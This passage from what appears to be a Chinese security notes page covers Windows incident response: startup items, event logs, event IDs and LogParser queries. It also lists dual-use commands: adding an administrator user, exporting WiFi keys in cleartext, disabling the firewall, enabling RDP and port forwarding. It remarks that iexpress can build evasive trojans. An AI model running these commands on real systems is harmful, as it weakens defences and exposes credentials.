+<p><font style="color:rgb(0, 0, 0);">遇到可疑的 IP，可以使用微步在线查看 IP 的信誉，alfred 快速搜索：<br></font><code>&lt;font style=&quot;color:rgb(192, 52, 29);background-color:rgb(245, 245, 245) !important;&quot;&gt;https://x.threatbook.cn/nodev4/ip/{query}&lt;/font&gt;</code></p>
+<p><font style="color:rgb(0, 0, 0);">防火墙配置：</font><code>&lt;font style=&quot;color:rgb(192, 52, 29);background-color:rgb(245, 245, 245) !important;&quot;&gt;netsh firewall show all&lt;/font&gt;</code></p>
+<h3 id="1-3-启动项、计划任务、服务"><a href="#1-3-启动项、计划任务、服务" class="headerlink" title="1.3 启动项、计划任务、服务"></a><font style="color:rgb(1, 110, 140);">1.3 启动项、计划任务、服务</font></h3><p><strong><font style="color:rgb(0, 0, 0);">1. 启动项相关</font></strong></p>
+<p><font style="color:rgb(0, 0, 0);">开机启动文件夹：</font><code>&lt;font style=&quot;color:rgb(192, 52, 29);background-color:rgb(245, 245, 245) !important;&quot;&gt;【开始】&gt;【所有程序】&gt;【启动】&lt;/font&gt;</code><font style="color:rgb(0, 0, 0);"><br></font><font style="color:rgb(0, 0, 0);">对应的路径：</font><code>&lt;font style=&quot;color:rgb(192, 52, 29);background-color:rgb(245, 245, 245) !important;&quot;&gt;C:\Users\xxxx\AppData\Roaming\Microsoft\Windows\Start Menu\Programs\Startup&lt;/font&gt;</code></p>
+<p><font style="color:rgb(0, 0, 0);">系统配置的启动项：</font><code>&lt;font style=&quot;color:rgb(192, 52, 29);background-color:rgb(245, 245, 245) !important;&quot;&gt;msconfig&lt;/font&gt;</code></p>
+<p><font style="color:rgb(0, 0, 0);">注册表的启动项：</font></p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">HKEY_CURRENT_USER\software\micorsoft\windows\currentversion\run HKEY_LOCAL_MACHINE\Software\Microsoft\Windows\CurrentVersion\Run HKEY_LOCAL_MACHINE\Software\Microsoft\Windows\CurrentVersion\Runonce</span><br></pre></td></tr></table></figure>
+
+<p><font style="color:rgb(0, 0, 0);">组策略：</font><code>&lt;font style=&quot;color:rgb(192, 52, 29);background-color:rgb(245, 245, 245) !important;&quot;&gt;gpedit.msc&lt;/font&gt;</code><font style="color:rgb(0, 0, 0);"> </font><font style="color:rgb(0, 0, 0);">依次选择</font><font style="color:rgb(0, 0, 0);"> </font><code>&lt;font style=&quot;color:rgb(192, 52, 29);background-color:rgb(245, 245, 245) !important;&quot;&gt;【计算机配置】【Windows 设置】【脚本】【启动】&lt;/font&gt;</code></p>
+<p><font style="color:rgb(0, 0, 0);">使用工具：</font><code>&lt;font style=&quot;color:rgb(192, 52, 29);background-color:rgb(245, 245, 245) !important;&quot;&gt;Autoruns&lt;/font&gt;</code></p>
+<p><strong><font style="color:rgb(0, 0, 0);">2. 服务相关</font></strong></p>
+<p><font style="color:rgb(0, 0, 0);">查看服务：</font><code>&lt;font style=&quot;color:rgb(192, 52, 29);background-color:rgb(245, 245, 245) !important;&quot;&gt;services.msc&lt;/font&gt;</code></p>
+<p><strong><font style="color:rgb(0, 0, 0);">3. 系统信息</font></strong></p>
+<p><font style="color:rgb(0, 0, 0);">查看系统信息及补丁：</font><code>&lt;font style=&quot;color:rgb(192, 52, 29);background-color:rgb(245, 245, 245) !important;&quot;&gt;systeminfo&lt;/font&gt;</code></p>
+<p><strong><font style="color:rgb(0, 0, 0);">4. 可疑文件和目录</font></strong></p>
+<p><font style="color:rgb(0, 0, 0);">自动生成的用户目录：</font></p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">Window 2003 C:\Documents and Settings</span><br><span class="line">Window 2008R2 C:\Users\</span><br></pre></td></tr></table></figure>
+
+<p><font style="color:rgb(0, 0, 0);">最近打开的文件：</font><code>&lt;font style=&quot;color:rgb(192, 52, 29);background-color:rgb(245, 245, 245) !important;&quot;&gt;%UserProfile%\Recent&lt;/font&gt;</code></p>
+<p><font style="color:rgb(0, 0, 0);">排查的几个点：</font></p>
+<ol>
+<li><font style="color:rgb(0, 0, 0);">回收站、浏览器下载记录、浏览器历史记录</font></li>
+<li><font style="color:rgb(0, 0, 0);">时间排序，查看最新的文件</font></li>
+<li><font style="color:rgb(0, 0, 0);">修改时间在创建时间之前的文件</font></li>
+</ol>
+<p><strong><font style="color:rgb(0, 0, 0);">5. 日志相关</font></strong></p>
+<p><font style="color:rgb(0, 0, 0);">查看日志：</font><code>&lt;font style=&quot;color:rgb(192, 52, 29);background-color:rgb(245, 245, 245) !important;&quot;&gt;eventvwr.msc&lt;/font&gt;</code></p>
+<h3 id="1-5-内存相关"><a href="#1-5-内存相关" class="headerlink" title="1.5 内存相关"></a><font style="color:rgb(1, 110, 140);">1.5 内存相关</font></h3><p><font style="color:rgb(0, 0, 0);">发现问题，可以先 dump 一份内存出来，两种方式：</font></p>
+<ol>
+<li><font style="color:rgb(0, 0, 0);">【我的电脑】右键选择【属性】，【高级系统设置】-【高级】-【启动和故障恢复里面的设置】，选择【写入调试信息】中的完全内存转储。</font></li>
+<li><font style="color:rgb(0, 0, 0);">命令行执行 </font><code>&lt;font style=&quot;color:rgb(192, 52, 29);background-color:rgb(245, 245, 245) !important;&quot;&gt;NotMyFault64.exe /crash&lt;/font&gt;</code><font style="color:rgb(0, 0, 0);">，生成的文件在 </font><code>&lt;font style=&quot;color:rgb(192, 52, 29);background-color:rgb(245, 245, 245) !important;&quot;&gt;%SystemRoot%\MEMORY.DMP&lt;/font&gt;</code></li>
+</ol>
+<h2 id="0x02、Windows-日志分析"><a href="#0x02、Windows-日志分析" class="headerlink" title="0x02、Windows 日志分析"></a><font style="color:rgb(0, 136, 145);">0x02、Windows 日志分析</font></h2><h3 id="2-1-日志目录"><a href="#2-1-日志目录" class="headerlink" title="2.1 日志目录"></a><font style="color:rgb(1, 110, 140);">2.1 日志目录</font></h3><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">Windows 2000 / Server2003 / Windows XP 的日志目录</span><br><span class="line">\%SystemRoot%\System32\Config\*.evt</span><br><span class="line"></span><br><span class="line">Windows Vista / 7 / 10 / Server2008 的日志目录</span><br><span class="line">\%SystemRoot%\System32\winevt\Logs\*.evtx</span><br><span class="line"></span><br><span class="line">系统日志（System.evtx）：驱动程序、系统组件和应用软件的崩溃以及数据丢失错误等</span><br><span class="line"></span><br><span class="line">应用程序日志（Application.evtx）：记录程序运行方面的事件</span><br><span class="line"></span><br><span class="line">安全日志（Security.evtx）：登录日志、对象访问日志、进程追踪日志、特权使用、帐号管理、策略变更、系统事件。安全日志也是调查取证中最常用到的日志。默认设置下，安全性日志是关闭的，管理员可以使用组策略来启动安全性日志，或者在注册表中设置审核策略，以便当安全性日志满后使系统停止响应</span><br></pre></td></tr></table></figure>
+
+<p><font style="color:rgb(0, 0, 0);">修改配置策略，默认的话只会记录一些简单的，可以按照下面这个改配置<br></font><code>&lt;font style=&quot;color:rgb(192, 52, 29);background-color:rgb(245, 245, 245) !important;&quot;&gt;修改方法：开始 → 管理工具 → 本地安全策略 → 本地策略 → 审核策略&lt;/font&gt;</code><font style="color:rgb(0, 0, 0);"><br></font><!-- 这是一张图片，ocr 内容为： --><br><img src="/assets/docs/WEB/%E5%BA%94%E6%80%A5%E5%93%8D%E5%BA%94/img-013.jpeg"><font style="color:rgb(0, 0, 0);">￼</font></p>
+<p><font style="color:rgb(0, 0, 0);">查看日志：</font><code>&lt;font style=&quot;color:rgb(192, 52, 29);background-color:rgb(245, 245, 245) !important;&quot;&gt;eventvwr.msc&lt;/font&gt;</code></p>
+<p><font style="color:rgb(0, 0, 0);">查看当前的审核策略：</font><code>&lt;font style=&quot;color:rgb(192, 52, 29);background-color:rgb(245, 245, 245) !important;&quot;&gt;auditpol /get /category:*&lt;/font&gt;</code></p>
+<h3 id="2-2-常见事件-ID"><a href="#2-2-常见事件-ID" class="headerlink" title="2.2 常见事件 ID"></a><font style="color:rgb(1, 110, 140);">2.2 常见事件 ID</font></h3><p><font style="color:rgb(0, 0, 0);">ID 对应 日志</font></p>
+<table>
+<thead>
+<tr>
+<th align="center"><font style="color:rgb(0, 0, 0);">(2000&#x2F;XP&#x2F;2003)</font></th>
+<th align="center"><font style="color:rgb(0, 0, 0);">(Vista&#x2F;7&#x2F;8&#x2F;2008&#x2F;2012)</font></th>
+<th align="center"><font style="color:rgb(0, 0, 0);">描述</font></th>
+<th align="center"><font style="color:rgb(0, 0, 0);">日志名称</font></th>
+</tr>
+</thead>
+<tbody><tr>
+<td align="center"><font style="color:rgb(61, 61, 61);">528</font></td>
+<td align="center"><font style="color:rgb(61, 61, 61);">4624</font></td>
+<td align="center"><font style="color:rgb(61, 61, 61);">成功登录</font></td>
+<td align="center"><font style="color:rgb(61, 61, 61);">Security</font></td>
+</tr>
+<tr>
+<td align="center"><font style="color:rgb(61, 61, 61);">529</font></td>
+<td align="center"><font style="color:rgb(61, 61, 61);">4625</font></td>
+<td align="center"><font style="color:rgb(61, 61, 61);">失败登录</font></td>
+<td align="center"><font style="color:rgb(61, 61, 61);">Security</font></td>
+</tr>
+<tr>
+<td align="center"><font style="color:rgb(61, 61, 61);">680</font></td>
+<td align="center"><font style="color:rgb(61, 61, 61);">4776</font></td>
+<td align="center"><font style="color:rgb(61, 61, 61);">成功&#x2F;失败的账户认证</font></td>
+<td align="center"><font style="color:rgb(61, 61, 61);">Security</font></td>
+</tr>
+<tr>
+<td align="center"><font style="color:rgb(61, 61, 61);">624</font></td>
+<td align="center"><font style="color:rgb(61, 61, 61);">4720</font></td>
+<td align="center"><font style="color:rgb(61, 61, 61);">创建用户</font></td>
+<td align="center"><font style="color:rgb(61, 61, 61);">Security</font></td>
+</tr>
+<tr>
+<td align="center"><font style="color:rgb(61, 61, 61);">636</font></td>
+<td align="center"><font style="color:rgb(61, 61, 61);">4732</font></td>
+<td align="center"><font style="color:rgb(61, 61, 61);">添加用户到启用安全性的本地组中</font></td>
+<td align="center"><font style="color:rgb(61, 61, 61);">Security</font></td>
+</tr>
+<tr>
+<td align="center"><font style="color:rgb(61, 61, 61);">632</font></td>
+<td align="center"><font style="color:rgb(61, 61, 61);">4728</font></td>
+<td align="center"><font style="color:rgb(61, 61, 61);">添加用户到启用安全性的全局组中</font></td>
+<td align="center"><font style="color:rgb(61, 61, 61);">Security</font></td>
+</tr>
+<tr>
+<td align="center"><font style="color:rgb(61, 61, 61);">2934</font></td>
+<td align="center"><font style="color:rgb(61, 61, 61);">7030</font></td>
+<td align="center"><font style="color:rgb(61, 61, 61);">服务创建错误</font></td>
+<td align="center"><font style="color:rgb(61, 61, 61);">System</font></td>
+</tr>
+<tr>
+<td align="center"><font style="color:rgb(61, 61, 61);">2944</font></td>
+<td align="center"><font style="color:rgb(61, 61, 61);">7040</font></td>
+<td align="center"><font style="color:rgb(61, 61, 61);">IPSEC服务服务的启动类型已从禁用更改为自动启动</font></td>
+<td align="center"><font style="color:rgb(61, 61, 61);">System</font></td>
+</tr>
+<tr>
+<td align="center"><font style="color:rgb(61, 61, 61);">2949</font></td>
+<td align="center"><font style="color:rgb(61, 61, 61);">7045</font></td>
+<td align="center"><font style="color:rgb(61, 61, 61);">服务创建</font></td>
+<td align="center"><font style="color:rgb(61, 61, 61);">System</font></td>
+</tr>
+</tbody></table>
+<p><font style="color:rgb(0, 0, 0);">登录类型</font></p>
+<table>
+<thead>
+<tr>
+<th align="center"><font style="color:rgb(0, 0, 0);">登录类型</font></th>
+<th align="center"><font style="color:rgb(0, 0, 0);">描述</font></th>
+<th align="center"><font style="color:rgb(0, 0, 0);">说明</font></th>
+</tr>
+</thead>
+<tbody><tr>
+<td align="center"><font style="color:rgb(61, 61, 61);">2</font></td>
+<td align="center"><font style="color:rgb(61, 61, 61);">交互式登录（Interactive）</font></td>
+<td align="center"><font style="color:rgb(61, 61, 61);">用户在本地进行登录。</font></td>
+</tr>
+<tr>
+<td align="center"><font style="color:rgb(61, 61, 61);">3</font></td>
+<td align="center"><font style="color:rgb(61, 61, 61);">网络（Network）</font></td>
+<td align="center"><font style="color:rgb(61, 61, 61);">最常见的情况就是连接到共享文件夹或共享打印机时。</font></td>
+</tr>
+<tr>
+<td align="center"><font style="color:rgb(61, 61, 61);">4</font></td>
+<td align="center"><font style="color:rgb(61, 61, 61);">批处理（Batch）</font></td>
+<td align="center"><font style="color:rgb(61, 61, 61);">通常表明某计划任务启动。</font></td>
+</tr>
+<tr>
+<td align="center"><font style="color:rgb(61, 61, 61);">5</font></td>
+<td align="center"><font style="color:rgb(61, 61, 61);">服务（Service）</font></td>
+<td align="center"><font style="color:rgb(61, 61, 61);">每种服务都被配置在某个特定的用户账号下运行。</font></td>
+</tr>
+<tr>
+<td align="center"><font style="color:rgb(61, 61, 61);">7</font></td>
+<td align="center"><font style="color:rgb(61, 61, 61);">解锁（Unlock）</font></td>
+<td align="center"><font style="color:rgb(61, 61, 61);">屏保解锁。</font></td>
+</tr>
+<tr>
+<td align="center"><font style="color:rgb(61, 61, 61);">8</font></td>
+<td align="center"><font style="color:rgb(61, 61, 61);">网络明文（NetworkCleartext）</font></td>
+<td align="center"><font style="color:rgb(61, 61, 61);">登录的密码在网络上是通过明文传输的，如FTP。</font></td>
+</tr>
+<tr>
+<td align="center"><font style="color:rgb(61, 61, 61);">9</font></td>
+<td align="center"><font style="color:rgb(61, 61, 61);">新凭证（NewCredentials）</font></td>
+<td align="center"><font style="color:rgb(61, 61, 61);">使用带&#x2F;Netonly参数的RUNAS命令运行一个程序。</font></td>
+</tr>
+<tr>
+<td align="center"><font style="color:rgb(61, 61, 61);">10</font></td>
+<td align="center"><font style="color:rgb(61, 61, 61);">远程交互，（RemoteInteractive）</font></td>
+<td align="center"><font style="color:rgb(61, 61, 61);">通过终端服务、远程桌面或远程协助访问计算机。</font></td>
+</tr>
+<tr>
+<td align="center"><font style="color:rgb(61, 61, 61);">11</font></td>
+<td align="center"><font style="color:rgb(61, 61, 61);">缓存交互（CachedInteractive）</font></td>
+<td align="center"><font style="color:rgb(61, 61, 61);">以一个域用户登录而又没有域控制器可用</font></td>
+</tr>
+</tbody></table>
+<h3 id="2-3-日志分析工具-Log-Parser"><a href="#2-3-日志分析工具-Log-Parser" class="headerlink" title="2.3 日志分析工具 - Log Parser"></a><font style="color:rgb(1, 110, 140);">2.3 日志分析工具 - Log Parser</font></h3><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line">登录成功的所有事件</span><br><span class="line">LogParser.exe -i:EVT –o:DATAGRID  &quot;SELECT *  FROM c:\Security.evtx where EventID=4624&quot;</span><br><span class="line"></span><br><span class="line">指定登录时间范围的事件：</span><br><span class="line">LogParser.exe -i:EVT –o:DATAGRID  &quot;SELECT *  FROM c:\Security.evtx where TimeGenerated&gt;&#x27;2018-06-19 23:32:11&#x27; and TimeGenerated&lt;&#x27;2018-06-20 23:34:00&#x27; and EventID=4624&quot;</span><br><span class="line"></span><br><span class="line">提取登录成功的用户名和IP：</span><br><span class="line">LogParser.exe -i:EVT  –o:DATAGRID  &quot;SELECT EXTRACT_TOKEN(Message,13,&#x27; &#x27;) as EventType,TimeGenerated as LoginTime,EXTRACT_TOKEN(Strings,5,&#x27;|&#x27;) as Username,EXTRACT_TOKEN(Message,38,&#x27; &#x27;) as Loginip FROM c:\Security.evtx where EventID=4624&quot;</span><br><span class="line"></span><br><span class="line">登录失败的所有事件：</span><br><span class="line">LogParser.exe -i:EVT –o:DATAGRID  &quot;SELECT *  FROM c:\Security.evtx where EventID=4625&quot;</span><br><span class="line"></span><br><span class="line">提取登录失败用户名进行聚合统计：</span><br><span class="line">LogParser.exe  -i:EVT &quot;SELECT  EXTRACT_TOKEN(Message,13,&#x27; &#x27;)  as EventType,EXTRACT_TOKEN(Message,19,&#x27; &#x27;) as user,count(EXTRACT_TOKEN(Message,19,&#x27; &#x27;)) as Times,EXTRACT_TOKEN(Message,39,&#x27; &#x27;) as Loginip FROM c:\Security.evtx where EventID=4625 GROUP BY Message&quot;</span><br><span class="line"></span><br><span class="line">LogParser.exe -i:EVT –o:DATAGRID  &quot;SELECT TimeGenerated,EventID,Message FROM c:\System.evtx where EventID=6005 or EventID=6006&quot;</span><br></pre></td></tr></table></figure>
+
+<h2 id="0x03、快捷指令"><a href="#0x03、快捷指令" class="headerlink" title="0x03、快捷指令"></a><font style="color:rgb(0, 136, 145);">0x03、快捷指令</font></h2><h3 id="系统相关"><a href="#系统相关" class="headerlink" title="系统相关"></a><font style="color:rgb(1, 110, 140);">系统相关</font></h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><span class="line">1. compmgmt.msc---计算机管理</span><br><span class="line">【包括 计划任务、事件查看器、共享文件夹、本地用户和组、设备管理器、磁盘管理、服务、WMI】</span><br><span class="line">2. devmgmt.msc----设备管理器 【包含于compmgmt】</span><br><span class="line">3. lusrmgr.msc----本地用户和组【包含于compmgmt】4. perfmon.msc----计算机性能监测程序 【包含于compmgmt】</span><br><span class="line">5. diskmgmt.msc---磁盘管理实用程序 【包含于compmgmt】</span><br><span class="line">6. fsmgmt.msc-----共享文件夹管理器 【包含于compmgmt】</span><br><span class="line">7. services.msc---本地服务设置    【包含于compmgmt】</span><br><span class="line">8. eventvwr.msc---事件查看器     【包含于compmgmt】</span><br><span class="line">9. wmimgmt.msc----打开windows管理体系结构(WMI) 【包含于compmgmt】</span><br><span class="line">10. gpedit.msc----组策略</span><br><span class="line">11. regedt32------注册表编辑器    【与 regedit 类似】</span><br><span class="line">12. Msconfig.exe--系统配置实用程序 【包括引导、服务、启动项和工具】</span><br><span class="line">13. rsop.msc------组策略结果集 </span><br><span class="line">14. regedit.exe---注册表 </span><br><span class="line">15. dcomcnfg------打开系统组件服务 【包括 组件服务、事件查看器、服务】</span><br><span class="line">16. wscript-------windows脚本宿主设置 </span><br><span class="line">17. certmgr.msc---证书管理实用程序 【排查电脑内恶意证书】</span><br><span class="line">18. secpol.msc----本地安全策略 </span><br><span class="line">19. services.msc--本地服务设置 </span><br><span class="line">20. gpedit.msc----组策略</span><br><span class="line">21. sigverif------文件签名验证程序 【可以快速筛选出来没有通过签名验证的程序】</span><br></pre></td></tr></table></figure>
+
+<h3 id="程序快速启动"><a href="#程序快速启动" class="headerlink" title="程序快速启动"></a><font style="color:rgb(1, 110, 140);">程序快速启动</font></h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line">1. explorer-------打开资源管理器 </span><br><span class="line">2. notepad--------打开记事本</span><br><span class="line">3. charmap--------打开字符映射表 </span><br><span class="line">4. calc-----------打开计算器 </span><br><span class="line">5. taskmgr--------打开任务管理器</span><br><span class="line">6. mstsc----------远程桌面连接 </span><br><span class="line">7. write----------打开写字板 </span><br><span class="line">8. mspaint--------打开画图板 </span><br><span class="line">9. magnify--------放大镜实用程序 </span><br><span class="line">10. mmc-----------打开控制台  </span><br><span class="line">11. Sndvol32------打开音量控制程序 </span><br><span class="line">12. eudcedit------打开造字程序 </span><br><span class="line">13. cliconfg------SQL SERVER 客户端网络实用程序</span><br><span class="line">14. osk-----------打开屏幕键盘 </span><br><span class="line">15. odbcad32------ODBC数据源管理器 </span><br><span class="line">16. iexpress------捆绑工具，系统自带【可以用来制作免杀马】</span><br></pre></td></tr></table></figure>
+
+<h3 id="磁盘相关"><a href="#磁盘相关" class="headerlink" title="磁盘相关"></a><font style="color:rgb(1, 110, 140);">磁盘相关</font></h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">1. cleanmgr-------打开磁盘清理工具</span><br><span class="line">2. chkdsk.exe-----Chkdsk磁盘检查</span><br></pre></td></tr></table></figure>
+
+<h3 id="检查相关"><a href="#检查相关" class="headerlink" title="检查相关"></a><font style="color:rgb(1, 110, 140);">检查相关</font></h3><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">1. dxdiag---------检查DirectX信息</span><br><span class="line">2. winver---------检查Windows版本</span><br><span class="line">3. sfc /scannow---扫描错误并复原</span><br><span class="line">4. sfc.exe--------系统文件检查器</span><br></pre></td></tr></table></figure>
+
+<h2 id="0x04、常用的命令"><a href="#0x04、常用的命令" class="headerlink" title="0x04、常用的命令"></a><font style="color:rgb(0, 136, 145);">0x04、常用的命令</font></h2><h3 id="net-相关"><a href="#net-相关" class="headerlink" title="net 相关"></a><font style="color:rgb(1, 110, 140);">net 相关</font></h3><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br></pre></td><td class="code"><pre><span class="line">查看域中当前的主机列表：</span><br><span class="line">net view /domain</span><br><span class="line"></span><br><span class="line">查看当前域中的用户</span><br><span class="line">net user /domain</span><br><span class="line"></span><br><span class="line">增加一个本地用户</span><br><span class="line">net user username password /add</span><br><span class="line"></span><br><span class="line">将新增的用户加到本地管理员组</span><br><span class="line">net localgroup &quot;Administrators&quot; username /add</span><br><span class="line"></span><br><span class="line">查看域中的密码策略</span><br><span class="line">net accounts /domain</span><br><span class="line"></span><br><span class="line">查看本地组</span><br><span class="line">net localgroup &quot;Group&quot;</span><br><span class="line"></span><br><span class="line">查看域中的组信息</span><br><span class="line">net group /domain</span><br><span class="line"></span><br><span class="line">查看域中指定组的成员</span><br><span class="line">net group &quot;Domain group&quot; /domain</span><br><span class="line"></span><br><span class="line">查看当前机器所在的域名</span><br><span class="line">net config workstation</span><br><span class="line"></span><br><span class="line">查看当前服务器所在的域名</span><br><span class="line">net config server</span><br></pre></td></tr></table></figure>
+
+<h3 id="系统显示相关"><a href="#系统显示相关" class="headerlink" title="系统显示相关"></a><font style="color:rgb(1, 110, 140);">系统显示相关</font></h3><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line">显示系统信息</span><br><span class="line">systeminfo</span><br><span class="line"></span><br><span class="line">查看远程主机的系统信息</span><br><span class="line">systeminfo /S ip /U domain\user /P Pwd</span><br><span class="line"></span><br><span class="line">显示进程和服务信息</span><br><span class="line">tasklist /svc</span><br><span class="line"></span><br><span class="line">显示所有进程以及DLL信息</span><br><span class="line">tasklist /m</span><br><span class="line"></span><br><span class="line">显示进程和所有者</span><br><span class="line">tasklist /v</span><br><span class="line"></span><br><span class="line">查看远程主机的进程列表</span><br><span class="line">tasklist /S ip /v</span><br><span class="line"></span><br><span class="line">显示具体的服务信息（包括二进制路径和运行使用）</span><br><span class="line">sc qc Spooler</span><br></pre></td></tr></table></figure>
+
+<h3 id="网络信息"><a href="#网络信息" class="headerlink" title="网络信息"></a><font style="color:rgb(1, 110, 140);">网络信息</font></h3><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line">打印路由表</span><br><span class="line">route print</span><br><span class="line"></span><br><span class="line">保存当前主机上的所有WiFi信息</span><br><span class="line">netsh wlan export profile folder=. key=clear</span><br><span class="line"></span><br><span class="line">设置当前配置禁用防火墙</span><br><span class="line">netsh advfirewall set currentprofile state off</span><br><span class="line"></span><br><span class="line">设置端口转发</span><br><span class="line">netsh interface portproxy add v4tov4 listenport=3000 listenaddress=l.l.l.l connectport=4000 connectaddress=2.2.2.2</span><br><span class="line"></span><br><span class="line">启用远程访问</span><br><span class="line">reg add &quot;HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Control\Terminal Server&quot; /v fDenyTSConnections /t REG_DWORD /d 0 /f</span><br><span class="line"></span><br><span class="line">启用远程协助</span><br><span class="line">reg add &quot;HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Control\Terminal Server&quot; /v fAllowToGetHelp /t REG_DWORD /d 1 /f</span><br><span class="line"></span><br><span class="line">修改远程访问端口</span><br><span class="line">reg add &quot;HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Control\Terminal Server\WinStations\RDP-Tcp&quot; /v PortNumber /t REG_DWORD /d 12345 /f</span><br></pre></td></tr></table></figure>
+
+<h3 id="一些工具"><a href="#一些工具" class="headerlink" title="一些工具"></a><font style="color:rgb(1, 110, 140);">一些工具</font></h3><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">Procexp -----查看进程的详细信息，比如 加载的 dll 文件、签名、内存使用等</span><br><span class="line">autoruns ----查看计划任务、自启动、服务等信息</span><br><span class="line">TCPView -----查看网络连接的情况</span><br><span class="line">PSExec ------轻量级的 telnet 工具</span><br><span class="line"></span><br><span class="line">Registry Workshop：好用的注册表工具</span><br><span class="line">Event Log Explorer：查看系统日志</span><br></pre></td></tr></table></figure>
+
+
+
+<h2 id=""><a href="#" class="headerlink" title=""></a></h2><h1 id="【汇总】Windows-linux-敏感目录-路径汇总"><a href="#【汇总】Windows-linux-敏感目录-路径汇总" class="headerlink" title="【汇总】Windows linux 敏感目录 路径汇总"></a><a target="_blank" rel="noopener" href="https://www.cnblogs.com/v1vvwv/p/Sensitive-Information-Leakge.html"><font style="color:rgb(0, 0, 0);">【汇总】Windows linux 敏感目录 路径汇总</font></a></h1><hr>
+<p><font style="color:rgb(51, 51, 51);"></font></p>
+<h2 id="0x01、-基本信息"><a href="#0x01、-基本信息" class="headerlink" title="0x01、 基本信息"></a><font style="color:rgb(0, 136, 145);">0x01、 基本信息</font></h2><p><font style="color:rgb(0, 0, 0);">遇到文件包含、任意文件下载等漏洞的时候，可以结合这篇文章，进行下一步攻击。</font></p>
+<h2 id="0x02、配置文件"><a href="#0x02、配置文件" class="headerlink" title="0x02、配置文件"></a><font style="color:rgb(0, 136, 145);">0x02、配置文件</font></h2><h3 id="查找文件"><a href="#查找文件" class="headerlink" title="查找文件"></a><font style="color:rgb(1, 110, 140);">查找文件</font></h3><p><font style="color:rgb(0, 0, 0);">如果能够命令执行，直接使用查找命令吧。。。</font></p>
+<p><strong><font style="color:rgb(0, 0, 0);">Linux 相关：</font></strong></p>
